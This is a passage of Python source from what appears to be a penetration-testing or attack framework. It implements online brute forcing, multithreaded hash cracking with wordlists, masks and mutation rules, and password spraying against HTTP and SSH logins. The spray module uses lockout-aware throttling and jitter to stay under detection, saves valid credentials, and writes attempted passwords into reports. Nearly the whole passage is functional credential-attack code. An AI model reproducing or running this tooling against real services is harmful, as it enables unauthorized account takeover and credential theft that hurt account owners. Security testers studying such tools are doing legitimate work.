                            lockouts[username] = failure_counts[username]
                            locked_users.add(username)
                    else:
                        failure_counts.pop(username, None)
                    if outcome.error and not outcome.success:
                        errors.append(outcome.error)
                        if profile['error_backoff'] > 0 and not outcome.lockout:
                            time.sleep(profile['error_backoff'])
                    if outcome.success:
                        record = BruteForceSuccess(
                            username=username,
                            service=profile['service'],
                            target=profile['target'],
                            password_preview=self._mask_secret_fragment(password),
                            password_hash=hashlib.sha256(password.encode('utf-8', 'ignore')).hexdigest(),
                            evidence=outcome.evidence,
                            latency=outcome.latency,
                            timestamp=self._utc_timestamp()
                        )
                        successes.append(record)
                        try:
                            if hasattr(self.logger, 'save_credential'):
                                self.logger.save_credential(username, password, f"{profile['service'].upper()}:{profile['target']}")
                        except Exception:
                            pass
                        self._audit_brute_force_success(profile, record)
                        if profile['stop_on_success']:
                            aborted_reason = 'success'
                            break
                    if outcome.fatal:
                        aborted_reason = outcome.error or 'fatal'
                        break
                if aborted_reason:
                    break
        duration = time.time() - start_time
        return {
            'attempts': total_attempts,
            'successes': successes,
            'errors': errors,
            'lockouts': lockouts,
            'attempt_log': list(attempt_log),
            'aborted_reason': aborted_reason,
            'duration': duration,
            'start_time': start_time
        }

    def _attempt_brute_force_credential(self, connector, profile, username, password, sequence):
        self._enforce_brute_force_delay(profile)
        start = time.time()
        outcome = AttemptOutcome(success=False)
        try:
            outcome = connector.attempt(username, password, profile)
            if not isinstance(outcome, AttemptOutcome):
                outcome = AttemptOutcome(success=bool(outcome))
        except Exception as exc:
            self.error_handler.handle_error(exc, "Brute force attempt")
            outcome = AttemptOutcome(success=False, error=str(exc))
        outcome.latency = time.time() - start
        return outcome

    def _enforce_brute_force_delay(self, profile):
        if getattr(self, 'rate_limiter', None):
            self.rate_limiter.wait_if_needed()
        delay = profile['delay']
        if delay <= 0:
            return
        jitter = profile['jitter']
        effective = delay
        if jitter:
            effective += random.uniform(-jitter, jitter)
        if effective > 0:
            time.sleep(effective)

    def _display_brute_force_summary(self, profile, result):
        duration = result['duration'] or 0.0
        throughput = (result['attempts'] / duration) if duration else 0.0
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}BRUTE FORCE SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Attempts : {Fore.CYAN}{result['attempts']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Throughput : {Fore.CYAN}{throughput:.2f} attempts/s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{len(result['successes'])}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Locked users : {Fore.YELLOW}{len(result['lockouts'])}{Style.RESET_ALL}")
        if result['aborted_reason'] and result['aborted_reason'] not in {'success'}:
            print(f"{Fore.YELLOW}[!] Run ended because: {result['aborted_reason']}{Style.RESET_ALL}")
        if result['successes']:
            print(f"\n{Fore.GREEN}[+] Valid credentials{Style.RESET_ALL}")
            for success in result['successes'][:5]:
                print(f" {success.username}:{success.password_preview} ({success.service}@{success.target})")
                if success.evidence:
                    print(f" Evidence: {success.evidence[:80]}")
        if result['lockouts']:
            print(f"\n{Fore.YELLOW}[!] Lockout indicators{Style.RESET_ALL}")
            for user, count in list(result['lockouts'].items())[:5]:
                print(f" {user} ({count} events)")
        if result['errors']:
            print(f"\n{Fore.YELLOW}[*] Recent errors{Style.RESET_ALL}")
            for error in result['errors'][-5:]:
                print(f" - {error[:90]}")
        if result['attempt_log']:
            print(f"\n{Fore.BLUE}[*] Recent attempts{Style.RESET_ALL}")
            for entry in result['attempt_log'][-profile['telemetry_tail']:]:
                status = 'OK' if entry['success'] else 'FAIL'
                print(f" {entry['username']:<12} {entry['password']:<10} -> {status} ({entry['latency']}s)")

    def _export_brute_force_results(self, profile, result):
        timestamp = int(time.time())
        safe_target = re.sub(r'[^A-Za-z0-9._-]', '_', profile['target']) or 'target'
        base_name = f"bruteforce_{profile['service']}_{safe_target}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        payload = {
            'profile': {
                'service': profile['service'],
                'target': profile['target'],
                'concurrency': profile['concurrency'],
                'delay': profile['delay'],
                'jitter': profile['jitter'],
                'max_attempts': profile['max_attempts']
            },
            'stats': {
                'attempts': result['attempts'],
                'duration': result['duration'],
                'successes': len(result['successes']),
                'lockouts': result['lockouts'],
                'aborted_reason': result['aborted_reason']
            },
            'successes': [success.__dict__ for success in result['successes']],
            'attempt_log': result['attempt_log']
        }
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(payload, fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("BRUTE FORCE REPORT\n")
                fh.write(f"Generated: {self._utc_timestamp()}\n")
                fh.write(f"Service : {profile['service']}\n")
                fh.write(f"Target : {profile['target']}\n")
                fh.write(f"Attempts: {result['attempts']} | Successes: {len(result['successes'])}\n")
                fh.write(f"Duration: {result['duration']:.2f}s | Lockouts: {len(result['lockouts'])}\n")
                if result['successes']:
                    fh.write("\nSuccessful credentials\n-----------------------\n")
                    for success in result['successes']:
                        fh.write(f"- {success.username}:{success.password_preview} ({success.service}@{success.target})\n")
                        if success.evidence:
                            fh.write(f" Evidence: {success.evidence}\n")
                if result['attempt_log']:
                    fh.write("\nRecent attempts\n---------------\n")
                    for entry in result['attempt_log']:
                        fh.write(f"{entry['username']}:{entry['password']} -> {'OK' if entry['success'] else 'FAIL'} ({entry['latency']}s)\n")
                if result['errors']:
                    fh.write("\nErrors\n------\n")
                    for error in result['errors'][-10:]:
                        fh.write(f"- {error}\n")
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting brute force results")
            return []
        return [json_path, txt_path]

    def _audit_brute_force_success(self, profile, success_record):
        audit_path = profile['audit_log']
        if not audit_path or str(audit_path).lower() in {'none', 'off'}:
            return
        entry = {
            'timestamp': success_record.timestamp,
            'session': profile['session_id'],
            'service': success_record.service,
            'target': success_record.target,
            'username': success_record.username,
            'password_preview': success_record.password_preview,
            'latency': success_record.latency
        }
        try:
            with open(audit_path, 'a', encoding='utf-8') as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass
    
    def run_hash_cracker(self):
        """Advanced hash cracking with streaming, masks, and auditing."""

        opts = self.module_options or {}
        inline_hash = (opts.get('hash') or '').strip()
        hash_file = (opts.get('hash_file') or '').strip()
        if not inline_hash and not hash_file:
            print(f"{Fore.RED}[!] Provide either 'hash' or 'hash_file' before running this module{Style.RESET_ALL}")
            return

        hash_type = (opts.get('type') or 'auto').strip().lower() or 'auto'
        salt = (opts.get('salt') or '').strip()
        salt_position = (opts.get('salt_position') or 'suffix').strip().lower()
        if salt_position not in {'prefix', 'suffix'}:
            salt_position = 'suffix'
        encoding = (opts.get('encoding') or 'utf-8').strip() or 'utf-8'
        case_sensitive = self._parse_bool_option(opts.get('case_sensitive', 'true'), True)
        smart_rules = self._parse_bool_option(opts.get('smart_rules', 'true'), True)
        mask_spec = (opts.get('mask') or '').strip()
        mask_limit = self._safe_int(opts.get('mask_limit'), 250000, 100, 1000000)
        heuristic_limit = self._safe_int(opts.get('heuristic_limit'), 5000, 100, 50000)
        max_workers = self._safe_int(opts.get('max_workers'), max(2, (os.cpu_count() or 2)), 1, 64)
        chunk_size = self._safe_int(opts.get('chunk_size'), max(max_workers * 400, 100), 50, 5000)
        rate_limit = self._safe_int(opts.get('rate_limit'), 0, 0, 100000)
        max_runtime = self._safe_float(opts.get('max_runtime'), 0.0, 0.0, 86400.0)
        progress_interval = self._safe_float(opts.get('progress_interval'), 5.0, 1.0, 30.0)
        dedup_limit = self._safe_int(opts.get('dedup_limit'), 200000, 0, 1000000)
        audit_log = (opts.get('audit_log') or '').strip()
        password_profile = (opts.get('password_profile') or 'core').strip().lower()
        wordlist_file = (opts.get('wordlist') or '').strip()

        print(f"{Fore.CYAN}[*] Loading candidates using profile '{password_profile}'{Style.RESET_ALL}")
        passwords = self._get_profile_entries('password_profiles', password_profile, self.wordlists.get('passwords', []))

        resolved_wordlist = self.resolve_wordlist_path(wordlist_file, 'password')
        wordlist_path = None
        if resolved_wordlist:
            wordlist_path = Path(resolved_wordlist)
        elif wordlist_file and not self.find_wordlist_entry(wordlist_file, 'password'):
            print(f"{Fore.YELLOW}[!] Wordlist not found: {wordlist_file}. Falling back to built-in dictionaries{Style.RESET_ALL}")

        registry = HashAlgorithmRegistry()
        targets: List[HashTarget] = []

        def register_target(value: str, algo_hint: str, source_label: str, salt_hint: Optional[str] = None):
            digest = (value or '').strip()
            if not digest:
                return
            algorithm = (algo_hint or 'auto').strip().lower()
            if algorithm in {'', 'auto'}:
                detected = identify_hash_algorithm(digest)
                if not detected and hash_type not in {'', 'auto'}:
                    detected = hash_type
                algorithm = detected or ''
            if not algorithm:
                print(f"{Fore.YELLOW}[!] Could not identify algorithm for hash '{digest[:16]}...'. Skipping{Style.RESET_ALL}")
                return
            if not registry.supports(algorithm):
                print(f"{Fore.YELLOW}[!] Algorithm {algorithm} not supported in current environment. Skipping hash from {source_label}{Style.RESET_ALL}")
                return
            targets.append(HashTarget(
                digest=digest,
                algorithm=algorithm,
                salt=(salt_hint if salt_hint is not None else salt),
                salt_position=salt_position,
                source=source_label
            ))

        if inline_hash:
            register_target(inline_hash, hash_type, 'inline')

        if hash_file:
            hash_path = Path(hash_file).expanduser()
            if not hash_path.exists():
                print(f"{Fore.YELLOW}[!] Hash file not found: {hash_file}{Style.RESET_ALL}")
            else:
                try:
                    with open(hash_path, 'r', encoding=encoding, errors='ignore') as handle:
                        for idx, line in enumerate(handle, 1):
                            line = line.strip()
                            if not line or line.startswith('#'):
                                continue
                            parts = [part.strip() for part in line.split('|')]
                            algo_hint = None
                            salt_hint = None
                            digest_value = parts[0]
                            if len(parts) == 2:
                                algo_hint, digest_value = parts
                            elif len(parts) >= 3:
                                algo_hint, salt_hint, digest_value = parts[:3]
                            register_target(digest_value, algo_hint or hash_type, f"file:{hash_path.name}:{idx}", salt_hint)
                except OSError as exc:
                    self.error_handler.handle_error(exc, 'Loading hash file')
                    return

        if not targets:
            print(f"{Fore.RED}[!] No valid hash targets were loaded. Aborting.{Style.RESET_ALL}")
            return

        algorithms = ', '.join(sorted({t.algorithm for t in targets}))
        print(f"{Fore.CYAN}[*] Targets loaded: {len(targets)} ({algorithms}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Smart rules: {'ON' if smart_rules else 'OFF'} | Mask: {mask_spec or 'n/a'} | Encoding: {encoding}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Workers: {max_workers} | Chunk size: {chunk_size} | Dedup window: {dedup_limit or 'disabled'}{Style.RESET_ALL}")
        if rate_limit:
            print(f"{Fore.CYAN}[*] Rate limit: {rate_limit} attempts/sec{Style.RESET_ALL}")

        candidate_sources: List[Tuple[str, Any]] = []
        if passwords:
            candidate_sources.append(('profile', iter(passwords)))
        if wordlist_path:
            try:
                candidate_sources.append(('wordlist', stream_wordlist(wordlist_path, encoding)))
            except OSError as exc:
                self.error_handler.handle_error(exc, 'Opening wordlist')
        if mask_spec:
            candidate_sources.append(('mask', generate_mask_candidates(mask_spec, mask_limit)))
        candidate_sources.append(('heuristics', iter_default_patterns(limit=heuristic_limit)))

        source_counter: Counter = Counter()

        def candidate_stream():
            seen = set()

            def allow(candidate_value: str) -> bool:
                if dedup_limit <= 0:
                    return True
                key = candidate_value if case_sensitive else candidate_value.lower()
                if len(seen) >= dedup_limit:
                    seen.clear()
                if key in seen:
                    return False
                seen.add(key)
                return True

            for label, iterator in candidate_sources:
                for candidate in iterator:
                    candidate = (candidate or '').strip()
                    if not candidate:
                        continue
                    if not allow(candidate):
                        continue
                    source_counter[label] += 1
                    yield candidate
                    if smart_rules:
                        for variant in apply_smart_rules(candidate):
                            if not allow(variant):
                                continue
                            source_counter['smart_rules'] += 1
                            yield variant

        limiter = RateLimiter(max_requests=rate_limit, time_window=1) if rate_limit else None
        engine = HashCrackerEngine(registry, limiter=limiter)
        stop_event = threading.Event()

        def progress_callback(event: str, payload: Dict[str, Any]):
            if event == 'status':
                print(
                    f"\r{Fore.BLUE}⟳ Attempts: {payload['attempts']:,} | Rate: {payload['rate']:.0f}/s | Cracked: {payload['cracked']}/{payload['total']} | Elapsed: {payload['elapsed']:.1f}s{Style.RESET_ALL}",
                    end='',
                    flush=True
                )
            elif event == 'match':
                target = payload['target']
                print(
                    f"\n{Fore.GREEN}[+] {target.algorithm.upper()} hash from {target.source} -> {payload['password']}{Style.RESET_ALL}",
                    flush=True
                )

        summary = engine.crack(
            targets=targets,
            candidates=candidate_stream(),
            encoding=encoding,
            case_sensitive=case_sensitive,
            max_workers=max_workers,
            chunk_size=chunk_size,
            stop_event=stop_event,
            progress_callback=progress_callback,
            progress_interval=progress_interval,
            max_runtime=max_runtime
        )

        print()
        print(f"{Fore.CYAN}[*] Attempts: {summary.attempts:,} | Duration: {summary.duration:.2f}s | Remaining: {summary.remaining}{Style.RESET_ALL}")

        if summary.cracked:
            for record in summary.cracked:
                print(f"{Fore.GREEN}[+] {record.algorithm.upper()} ({record.source}) -> {record.cracked_password}{Style.RESET_ALL}")
                self.logger.log(
                    f"Hash cracked ({record.algorithm}) {record.digest[:12]}... -> {record.cracked_password}",
                    "SUCCESS"
                )
        else:
            print(f"{Fore.YELLOW}[*] No hashes cracked with the current inputs{Style.RESET_ALL}")

        if audit_log and summary.cracked:
            try:
                audit_path = Path(audit_log).expanduser()
                with open(audit_path, 'a', encoding='utf-8') as handle:
                    for record in summary.cracked:
                        handle.write(json.dumps({
                            'timestamp': self._utc_timestamp(),
                            'hash': record.digest,
                            'algorithm': record.algorithm,
                            'password': record.cracked_password,
                            'source': record.source
                        }) + "\n")
                print(f"{Fore.GREEN}[+] Audit log updated: {audit_path}{Style.RESET_ALL}")
            except OSError as exc:
                self.error_handler.handle_error(exc, 'Writing hash audit log')

        if summary.errors:
            print(f"{Fore.YELLOW}[!] Engine reported {len(summary.errors)} error(s):{Style.RESET_ALL}")
            for err in summary.errors[-5:]:
                print(f" - {err}")

        if source_counter:
            print(f"{Fore.BLUE}[*] Candidate source utilization:{Style.RESET_ALL}")
            for label, count in source_counter.most_common():
                print(f" {label:<12} {count:,}")

        if summary.stop_reason == 'runtime':
            print(f"{Fore.YELLOW}[!] Cracking stopped because the max runtime was reached{Style.RESET_ALL}")
        elif summary.stopped and summary.stop_reason != 'completed':
            print(f"{Fore.YELLOW}[!] Cracking stopped early (reason: {summary.stop_reason or 'external signal'}){Style.RESET_ALL}")
    
    def run_spray_attack(self):
        """Adaptive password spray orchestrator with auditing and throttling."""
        profile = self._resolve_spray_profile()
        if not profile:
            return None
        usernames, passwords = self._load_brute_force_lists(profile)
        if not usernames:
            print(f"{Fore.RED}[!] Username dataset empty; adjust username_profile or provide a list.{Style.RESET_ALL}")
            return None
        if not passwords:
            print(f"{Fore.RED}[!] Password dataset empty; adjust password_profile or provide a list.{Style.RESET_ALL}")
            return None
        try:
            connector = self._get_brute_force_connector(profile)
        except RuntimeError as exc:
            print(f"{Fore.RED}[!] {exc}{Style.RESET_ALL}")
            return None
        except Exception as exc:
            self.error_handler.handle_error(exc, "Initializing spray connector")
            return None

        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PASSWORD SPRAY MODULE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Service : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Usernames : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Passwords : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Concurrency : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
        print(f"{Fore.WHITE} Attempt delay : {Fore.CYAN}{profile['attempt_delay']}s ± {profile['attempt_jitter']}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Password pause : {Fore.CYAN}{profile['password_cooldown']}s{Style.RESET_ALL}")
        if profile['rate_limit']:
            print(f"{Fore.WHITE} Rate limit : {Fore.CYAN}{profile['rate_limit']} req/{profile['rate_window']}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Stop on success: {Fore.CYAN}{profile['stop_on_success']}{Style.RESET_ALL}\n")

        result = self._execute_spray_campaign(profile, connector, usernames, passwords)
        if hasattr(connector, 'close'):
            connector.close()
        self._display_spray_summary(profile, result)
        report_paths = self._export_spray_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Spray reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        if not result['successes']:
            print(f"{Fore.YELLOW}[*] No valid credentials identified for provided lists.{Style.RESET_ALL}")
        return result

    def _resolve_spray_profile(self):
        opts = self.module_options
        service = (opts.get('service') or 'http').strip().lower()
        if service not in {'http', 'ssh', 'mock'}:
            print(f"{Fore.YELLOW}[!] Unknown service '{service}', defaulting to HTTP.{Style.RESET_ALL}")
            service = 'http'
        raw_target = (opts.get('target') or self.config.get('rhost') or '').strip()
        target = raw_target
        host = raw_target or '127.0.0.1'
        port = 22
        if service == 'http':
            if not raw_target or not self.validator.validate_url(raw_target):
                print(f"{Fore.RED}[!] Provide a valid HTTP(S) URL via 'target'.{Style.RESET_ALL}")
                return None
        elif service == 'ssh':
            if ':' in raw_target:
                host, raw_port = raw_target.rsplit(':', 1)
                port = self._safe_int(raw_port, 22, 1, 65535)
            target = f"{host}:{port}"
        else: # mock
            target = raw_target or 'mock-target'
            host = 'mock-target'
            port = 0

        profile = {
            'service': service,
            'target': target,
            'host': host,
            'port': port,
            'session_id': getattr(self, 'session_id', 'session'),
            'username': (opts.get('username') or '').strip(),
            'usernames_file': (opts.get('usernames') or '').strip(),
            'usernames_inline': opts.get('usernames_inline', ''),
            'passwords_file': (opts.get('passwords') or '').strip(),
            'passwords_inline': opts.get('passwords_inline', ''),
            'max_usernames': self._safe_int(opts.get('max_usernames'), 100, 1, 2000),
            'max_passwords': self._safe_int(opts.get('max_passwords'), 25, 1, 2000),
            'password_profile': (opts.get('password_profile') or 'spray').strip().lower(),
            'username_profile': (opts.get('username_profile') or 'core').strip().lower(),
            'concurrency': self._safe_int(opts.get('concurrency'), 4, 1, 32),
            'attempt_delay': self._safe_float(opts.get('attempt_delay') or opts.get('delay'), 0.0, 0.0, 5.0),
            'attempt_jitter': self._safe_float(opts.get('attempt_jitter') or opts.get('jitter'), 0.05, 0.0, 2.0),
            'password_cooldown': self._safe_float(opts.get('password_cooldown') or opts.get('password_delay'), 5.0, 0.0, 120.0),
            'password_jitter': self._safe_float(opts.get('password_jitter'), 0.5, 0.0, 5.0),
            'rate_limit': self._safe_int(opts.get('rate_limit'), 0, 0, 200),
            'rate_window': self._safe_float(opts.get('rate_window'), 60.0, 1.0, 600.0),
            'max_attempts': self._safe_int(opts.get('max_attempts'), 5000, 1, 50000),
            'max_runtime': self._safe_float(opts.get('max_runtime'), 1800.0, 30.0, 7200.0),
            'lockout_threshold': self._safe_int(opts.get('lockout_threshold'), 3, 1, 20),
            'telemetry_tail': self._safe_int(opts.get('telemetry_tail'), 10, 3, 40),
            'stop_on_success': self._parse_bool_option(opts.get('stop_on_success', 'true'), True),
            'audit_log': opts.get('audit_log', f"spray_{getattr(self, 'session_id', 'session')}_audit.log"),
            'report_prefix': opts.get('report_prefix', 'spray') or 'spray',
            'enable_hybrids': self._parse_bool_option(opts.get('hybrid', 'false'), False),
            'hybrid_limit': self._safe_int(opts.get('hybrid_limit'), 5, 1, 32),
            'hybrid_year': self._safe_int(opts.get('hybrid_year'), datetime.now().year, 1990, 2100),
            'error_backoff': self._safe_float(opts.get('error_backoff'), 0.3, 0.0, 5.0)
        }

        profile.update({
            'http_method': (opts.get('http_method', 'post') or 'post').strip().lower(),
            'http_success_indicators': [token.lower() for token in self._parse_list_option(opts.get('success_indicators', 'welcome,dashboard,logout,success'))] or ['welcome'],
            'http_success_codes': [self._safe_int(code, 0, 0, 999) for code in self._parse_list_option(opts.get('success_codes', '200,302'))],
            'http_lockout_codes': [self._safe_int(code, 0, 0, 999) for code in self._parse_list_option(opts.get('lockout_codes', '401,403,429'))],
            'http_lockout_indicators': [token.lower() for token in self._parse_list_option(opts.get('lockout_indicators', 'locked,too many attempts,try later'))],
            'http_username_field': opts.get('username_field', 'username'),
            'http_password_field': opts.get('password_field', 'password'),
            'http_extra_fields': self._parse_key_value_options(opts.get('http_extra_fields')),
            'http_headers': self._parse_key_value_options(opts.get('http_headers')),
            'http_format': (opts.get('http_format', 'form') or 'form').strip().lower(),
            'http_verify': self._parse_bool_option(opts.get('http_verify', 'false'), False),
            'http_timeout': self._safe_float(opts.get('http_timeout'), 10.0, 2.0, 60.0),
            'http_allow_redirects': self._parse_bool_option(opts.get('http_allow_redirects', 'true'), True),
            'mock_success_password': opts.get('mock_success_password', 'letmein'),
            'mock_valid_pairs': self._parse_key_value_options(opts.get('mock_valid_pairs')),
            'mock_lockout_after': self._safe_int(opts.get('mock_lockout_after'), 0, 0, 10)
        })

        if profile['http_method'] not in {'get', 'post'}:
            profile['http_method'] = 'post'
        if profile['rate_limit'] <= 0:
            profile['rate_limit'] = None
        return profile

    def _execute_spray_campaign(self, profile, connector, usernames, passwords):
        start_time = time.time()
        limiter = RateLimiter(max_requests=profile['rate_limit'], time_window=profile['rate_window']) if profile['rate_limit'] else None
        attempt_log = deque(maxlen=profile['telemetry_tail'])
        successes: List[SpraySuccessRecord] = []
        errors: List[str] = []
        warnings: List[str] = []
        lockouts: Counter = Counter()
        failure_counts: Counter = Counter()
        locked_users = set()
        total_attempts = 0
        stop_reason = None

        usernames = usernames[:profile['max_usernames']]
        passwords = passwords[:profile['max_passwords']]

        with concurrent.futures.ThreadPoolExecutor(max_workers=profile['concurrency']) as executor:
            for password in passwords:
                if stop_reason:
                    break
                batch: List[Tuple[concurrent.futures.Future, str, str]] = []
                for username in usernames:
                    if username in locked_users:
                        continue
                    future = executor.submit(self._spray_attempt_worker, connector, profile, limiter, username, password)
                    batch.append((future, username, password))
                    if len(batch) >= profile['concurrency']:
                        processed, reason = self._process_spray_batch(profile, batch, attempt_log, successes, lockouts, locked_users, failure_counts, errors)
                        total_attempts += processed
                        batch = []
                        if reason:
                            stop_reason = reason
                            break
                        if total_attempts >= profile['max_attempts']:
                            stop_reason = 'max_attempts'
                            break
                        if time.time() - start_time >= profile['max_runtime']:
                            stop_reason = 'max_runtime'
                            break
                if batch:
                    processed, reason = self._process_spray_batch(profile, batch, attempt_log, successes, lockouts, locked_users, failure_counts, errors)
                    total_attempts += processed
                    if not stop_reason and reason:
                        stop_reason = reason
                if stop_reason:
                    break
                self._sleep_with_jitter(profile['password_cooldown'], profile['password_jitter'])

        duration = time.time() - start_time
        rate = (total_attempts / duration) if duration else 0.0
        summary = SpraySummary(
            attempts=total_attempts,
            successes=len(successes),
            locked=len(lockouts),
            duration=duration,
            rate=rate,
            warnings=list(warnings),
            errors=list(errors)
        )
        return {
            'summary': summary,
            'successes': successes,
            'lockouts': dict(lockouts),
            'attempt_log': list(attempt_log),
            'warnings': warnings,
            'errors': errors,
            'stop_reason': stop_reason,
            'passwords_used': len(passwords),
            'usernames_used': len(usernames)
        }

    def _process_spray_batch(self, profile, batch, attempt_log, successes, lockouts, locked_users, failure_counts, errors):
        stop_reason = None
        processed = 0
        for future, username, password in batch:
            processed += 1
            if stop_reason:
                try:
                    future.result()
                except Exception as exc:
                    self.error_handler.handle_error(exc, "Spray worker")
                continue
            try:
                outcome = future.result()
            except Exception as exc:
                self.error_handler.handle_error(exc, "Spray worker")
                outcome = AttemptOutcome(success=False, error=str(exc))
            entry_status = 'success' if outcome.success else ('lockout' if outcome.lockout else 'fail')
            attempt_log.append({
                'username': username,
                'password': self._mask_secret_fragment(password),
                'status': entry_status,
                'latency': round(outcome.latency, 4)
            })
            if outcome.success:
                record = SpraySuccessRecord(
                    username=username,
                    password_preview=self._mask_secret_fragment(password),
                    password_hash=hashlib.sha256(password.encode('utf-8', 'ignore')).hexdigest(),
                    target=profile['target'],
                    service=profile['service'],
                    evidence=outcome.evidence,
                    timestamp=self._utc_timestamp()
                )
                successes.append(record)
                try:
                    if hasattr(self.logger, 'save_credential'):
                        self.logger.save_credential(username, password, f"{profile['service'].upper()}:{profile['target']}")
                except Exception:
                    pass
                self._audit_spray_success(profile, record)
                if profile['stop_on_success']:
                    stop_reason = 'success'
            elif outcome.lockout:
                lockouts[username] += 1
                locked_users.add(username)
            else:
                failure_counts[username] += 1
                if failure_counts[username] >= profile['lockout_threshold']:
                    lockouts[username] = failure_counts[username]
                    locked_users.add(username)
            if outcome.error and not outcome.success:
                errors.append(outcome.error)
                if profile['error_backoff'] > 0 and not outcome.lockout:
                    time.sleep(profile['error_backoff'])
        return processed, stop_reason

    def _spray_attempt_worker(self, connector, profile, limiter, username, password):
        if limiter:
            limiter.wait_if_needed()
        self._sleep_with_jitter(profile['attempt_delay'], profile['attempt_jitter'])
        start = time.time()
        outcome = AttemptOutcome(success=False)
        try:
            outcome = connector.attempt(username, password, profile)
            if not isinstance(outcome, AttemptOutcome):
                outcome = AttemptOutcome(success=bool(outcome))
        except Exception as exc:
            self.error_handler.handle_error(exc, "Spray attempt")
            outcome = AttemptOutcome(success=False, error=str(exc))
        outcome.latency = time.time() - start
        return outcome

    def _display_spray_summary(self, profile, result):
        summary = result['summary']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SPRAY SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Attempts : {Fore.CYAN}{summary.attempts}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{summary.successes}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Locked users : {Fore.YELLOW}{summary.locked}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Throughput : {Fore.CYAN}{summary.rate:.2f} req/s{Style.RESET_ALL}")
        if result['stop_reason']:
            print(f"{Fore.YELLOW}[!] Run ended because: {result['stop_reason']}{Style.RESET_ALL}")
        if result['warnings']:
            print(f"{Fore.YELLOW}[*] Warnings:{Style.RESET_ALL}")
            for warning in result['warnings'][:3]:
                print(f" - {warning}")
        if result['errors']:
            print(f"{Fore.YELLOW}[*] Errors:{Style.RESET_ALL}")
            for error in result['errors'][-3:]:
                print(f" - {error[:90]}")
        if result['successes']:
            print(f"\n{Fore.GREEN}[+] Valid credentials{Style.RESET_ALL}")
            for success in result['successes'][:5]:
                print(f" {success.username}:{success.password_preview} ({success.service}@{success.target})")
        if result['lockouts']:
            print(f"\n{Fore.YELLOW}[*] Lockout indicators{Style.RESET_ALL}")
            for username, count in list(result['lockouts'].items())[:5]:
                print(f" {username} ({count} events)")
        if result['attempt_log']:
            print(f"\n{Fore.BLUE}[*] Recent attempts{Style.RESET_ALL}")
            for entry in result['attempt_log'][-profile['telemetry_tail']:]:
                print(f" {entry['username']:<12} {entry['password']:<10} -> {entry['status'].upper()} ({entry['latency']}s)")

    def _export_spray_results(self, profile, result):
        timestamp = int(time.time())
        safe_target = re.sub(r'[^A-Za-z0-9._-]', '_', profile['target']) or 'target'
        base_name = f"{profile['report_prefix']}_{safe_target}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        payload = {
            'profile': {
                'service': profile['service'],
                'target': profile['target'],
                'concurrency': profile['concurrency'],
                'attempt_delay': profile['attempt_delay'],
                'password_cooldown': profile['password_cooldown']
            },
            'summary': result['summary'].__dict__,
            'successes': [record.__dict__ for record in result['successes']],
            'lockouts': result['lockouts'],
            'attempt_log': result['attempt_log'],
            'warnings': result['warnings'],
            'errors': result['errors'],
            'stop_reason': result['stop_reason']
        }
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(payload, fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("PASSWORD SPRAY REPORT\n")
                fh.write(f"Generated: {self._utc_timestamp()}\n")
                fh.write(f"Target: {profile['target']}\n")
                fh.write(f"Service: {profile['service']}\n")
                fh.write(f"Attempts: {result['summary'].attempts} | Successes: {result['summary'].successes}\n")
                fh.write(f"Duration: {result['summary'].duration:.2f}s | Rate: {result['summary'].rate:.2f} req/s\n")
                if result['successes']:
                    fh.write("\nSuccessful Credentials\n----------------------\n")
                    for record in result['successes']:
                        fh.write(f"- {record.username}:{record.password_preview} ({record.service}@{record.target})\n")
                        if record.evidence:
                            fh.write(f" Evidence: {record.evidence}\n")
                if result['lockouts']:
                    fh.write("\nLockout Indicators\n------------------\n")
                    for username, count in result['lockouts'].items():
                        fh.write(f"- {username}: {count}\n")
                if result['attempt_log']:
                    fh.write("\nRecent Attempts\n---------------\n")
                    for entry in result['attempt_log']:
                        fh.write(f"{entry['username']}:{entry['password']} -> {entry['status']} ({entry['latency']}s)\n")
                if result['warnings']:
                    fh.write("\nWarnings\n--------\n")
                    for warning in result['warnings']:
                        fh.write(f"- {warning}\n")
                if result['errors']:
                    fh.write("\nErrors\n------\n")
                    for error in result['errors'][-10:]:
                        fh.write(f"- {error}\n")
        except OSError as exc:
